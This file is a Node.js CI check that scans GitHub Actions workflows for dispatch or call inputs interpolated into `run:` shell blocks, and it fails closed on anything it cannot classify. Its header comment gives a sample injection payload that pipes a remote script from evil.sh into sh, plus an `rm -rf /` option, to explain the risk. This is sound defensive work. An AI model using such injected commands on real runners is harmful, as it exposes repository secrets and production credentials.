#!/usr/bin/env node
/**
 * Gate: a workflow input must never be interpolated into a `run:` block.
 *
 * `${{ … }}` is expanded by the Actions expression engine BEFORE the shell ever
 * sees the script, so the value is substituted as literal script text, not as an
 * argument. A dispatch input containing `"; curl evil.sh | sh; #` therefore runs
 * as a command on the runner — a runner that holds
 * `FIREBASE_SERVICE_ACCOUNT_JSON` (a service account with
 * `resourcemanager.projectIamAdmin`, i.e. owner-equivalent on production),
 * `CLAUDE_CODE_OAUTH_TOKEN`, `ARTICLES_REPO_PAT`, the shard deploy keys and the
 * App private key. That turns "can dispatch a workflow" into "can read every
 * secret in the repo". Issue #5032.
 *
 * The fix is always the same shape: pass the value through `env:` and reference
 * the QUOTED shell variable.
 *
 *     - name: …
 *       env:
 *         ARTICLE_URL: ${{ inputs.url }}
 *       run: node scripts/create-article.mjs "$ARTICLE_URL"
 *
 * Quote it. `--flag $VAR` still splits on whitespace, which is a bug even
 * without an attacker.
 *
 * ── What this gate allows, and why it is not a loophole ──────────────────────
 * `boolean` and `choice` inputs stay allowed inline: the Actions runtime only
 * ever produces `true`/`false` for a boolean, and rejects any value outside the
 * declared `options` for a choice, so neither can carry a shell metacharacter.
 * That premise is ENFORCED, not assumed — every declared `choice` option is
 * itself checked against a shell-safe character set below, so declaring an
 * option like `a; rm -rf /` fails this gate too. `number` (workflow_call) is
 * likewise constrained.
 *
 * Everything else — `string`, an undeclared/unresolvable input, or a
 * `github.event.inputs.*` read with no matching declaration — fails.
 *
 * Usage: node scripts/ci/check-workflow-input-injection.mjs [dir]
 * Exit 0 = clean, 1 = violations (listed on stderr).
 */
import fs from 'node:fs';
import path from 'node:path';
import { fileURLToPath } from 'node:url';
import YAML from 'yaml';

const __dirname = path.dirname(fileURLToPath(import.meta.url));
const ROOT = path.resolve(__dirname, '..', '..');

/** Does the expression read a workflow input at all? */
const READS_INPUT_RE = /\b(?:inputs|github\.event\.inputs)\s*[.[]/;
/** Every input reference in a chunk of text — used both to classify and to audit. */
const INPUT_REF_RE = /(?:github\.event\.)?inputs\.[A-Za-z0-9_-]+/g;
/** First input name mentioned, used to look up the declared type. */
const INPUT_NAME_RE = /(?:inputs|github\.event\.inputs)\.([A-Za-z0-9_-]+)/;
/** Types the Actions runtime constrains to a finite, metacharacter-free set. */
const CONSTRAINED_TYPES = new Set(['boolean', 'choice', 'number']);
/**
 * Characters a `choice` option may contain for the constraint to hold.
 * A leading `-` is excluded on purpose: it is not a shell metacharacter, but an
 * option named `--force` interpolated as a bare word turns into a FLAG rather
 * than a value for the script downstream. Constrained-but-flag-shaped is not
 * the property this exemption promises.
 */
const SAFE_OPTION_RE = /^(?!-)[A-Za-z0-9 _.,:@/+-]*$/;

/**
 * Every `${{ … }}` expression in a script, found by scanning for the closing
 * `}}` instead of by regex.
 *
 * A regex has to guess how many `}` an expression may contain (`format('{0}',
 * x)` has one, `fromJSON('{"a":{"b":1}}')` has three) and guessing wrong turns
 * an unmatched expression into a SILENT false negative — the one failure mode a
 * security gate must not have. Scanning cannot under-count, and an expression
 * that never closes is returned with `unterminated` so the caller can fail
 * CLOSED rather than skip it.
 *
 * @param {string} script
 * @returns {Array<{whole: string, body: string, unterminated?: boolean}>}
 */
export function actionsExpressions(script) {
  const s = String(script || '');
  const out = [];
  let i = 0;
  while (i < s.length) {
    const start = s.indexOf('${{', i);
    if (start === -1) break;
    const end = s.indexOf('}}', start + 3);
    if (end === -1) {
      out.push({ whole: s.slice(start), body: s.slice(start + 3), unterminated: true });
      break;
    }
    out.push({ whole: s.slice(start, end + 2), body: s.slice(start + 3, end) });
    i = end + 2;
  }
  return out;
}

/** Count of input references in a string. */
function countInputRefs(text) {
  INPUT_REF_RE.lastIndex = 0;
  return (String(text || '').match(INPUT_REF_RE) || []).length;
}

/**
 * Declared input types for one workflow document, across dispatch + call.
 *
 * One name can be declared by BOTH triggers (`choice` is dispatch-only, so a
 * workflow offering the same knob to callers must re-declare it as `string`).
 * The LEAST constrained declaration wins: the value can arrive through either
 * path, so the gate has to reason about the weakest guarantee, not the last one
 * parsed. No workflow in the fleet currently disagrees with itself — this keeps
 * it that way by construction rather than by observation.
 */
export function declaredInputs(doc) {
  const out = new Map();
  // `on:` parses as the boolean true under YAML 1.1 in some documents.
  const on = doc?.on ?? doc?.[true];
  for (const event of ['workflow_dispatch', 'workflow_call']) {
    const inputs = on?.[event]?.inputs;
    if (!inputs || typeof inputs !== 'object') continue;
    for (const [name, spec] of Object.entries(inputs)) {
      const type = spec?.type || 'string';
      const options = Array.isArray(spec?.options) ? spec.options : [];
      const prior = out.get(name);
      // Unconstrained beats constrained: if either declaration lets free text
      // through, the gate must treat the input as free text.
      if (prior && !CONSTRAINED_TYPES.has(prior.type)) continue;
      if (prior && CONSTRAINED_TYPES.has(type) && !CONSTRAINED_TYPES.has(prior.type)) continue;
      out.set(name, { type, options: options.length ? options : (prior?.options || []) });
    }
  }
  return out;
}

function* stepsOf(doc) {
  for (const [jobName, job] of Object.entries(doc?.jobs || {})) {
    for (const [index, step] of (job?.steps || []).entries()) {
      if (typeof step?.run === 'string') yield { jobName, index, step };
    }
  }
}

export function scanWorkflows(dir) {
  const violations = [];
  const files = fs.existsSync(dir)
    ? fs.readdirSync(dir).filter((f) => /\.ya?ml$/.test(f)).sort()
    : [];
  for (const file of files) {
    const raw = fs.readFileSync(path.join(dir, file), 'utf8');
    let doc;
    try {
      doc = YAML.parse(raw);
    } catch (err) {
      violations.push({ file, job: '-', step: '-', expr: '-', reason: `YAML parse error: ${err.message}` });
      continue;
    }
    if (!doc || typeof doc !== 'object') continue;
    const inputs = declaredInputs(doc);

    // A `choice` is only safe because its options are; verify that premise.
    for (const [name, spec] of inputs) {
      if (spec.type !== 'choice') continue;
      for (const option of spec.options) {
        if (!SAFE_OPTION_RE.test(String(option))) {
          violations.push({
            file, job: '-', step: `input "${name}"`, expr: String(option),
            reason: 'choice option contains a character outside the shell-safe set — the "enumerable inputs are safe" premise no longer holds',
          });
        }
      }
    }

    for (const { jobName, index, step } of stepsOf(doc)) {
      const where = { file, job: jobName, step: step.name || `step #${index}` };
      const expressions = actionsExpressions(step.run);
      const seen = new Set();
      for (const { whole, body, unterminated } of expressions) {
        if (unterminated) {
          violations.push({ ...where, expr: whole.trim().slice(0, 80), reason: 'unterminated ${{ expression — cannot verify what it expands to' });
          continue;
        }
        if (!READS_INPUT_RE.test(body)) continue;
        if (seen.has(whole)) continue;
        seen.add(whole);
        const name = (body.match(INPUT_NAME_RE) || [])[1] || '';
        const spec = inputs.get(name);
        if (spec && CONSTRAINED_TYPES.has(spec.type)) continue;
        violations.push({
          ...where,
          expr: whole.trim(),
          reason: spec
            ? `input "${name}" is type "${spec.type}" — free text reaching the shell as script`
            : `input "${name || '?'}" has no resolvable declaration — treat as free text`,
        });
      }
      // Fail CLOSED on anything the scanner did not account for: if the script
      // names more inputs than the parsed expressions do, some reference sits
      // outside a region this gate could classify, and "could not classify" must
      // never read the same as "safe".
      const inScript = countInputRefs(step.run);
      const inExpressions = expressions.reduce((n, e) => n + countInputRefs(e.body), 0);
      if (inScript > inExpressions) {
        violations.push({
          ...where,
          expr: `${inScript - inExpressions} input reference(s)`,
          reason: 'input referenced outside any parsed ${{ }} expression — the gate cannot verify it, so it is reported rather than skipped',
        });
      }
    }
  }
  return violations;
}

if (import.meta.url === `file://${process.argv[1]}`) {
  const dir = process.argv[2] || path.join(ROOT, '.github', 'workflows');
  const violations = scanWorkflows(dir);
  if (violations.length === 0) {
    console.log('✅ no workflow input interpolated into a run: block');
    process.exit(0);
  }
  console.error(`\n❌ ${violations.length} workflow input interpolation(s) inside run: blocks\n`);
  for (const v of violations) {
    console.error(`  ${v.file} › ${v.job} › ${v.step}`);
    console.error(`    ${v.expr}`);
    console.error(`    ${v.reason}\n`);
  }
  console.error('Fix: move the value into the step\'s `env:` and reference the QUOTED shell');
  console.error('variable ("$MY_VAR"), so it arrives as data instead of as script text.\n');
  process.exit(1);
}
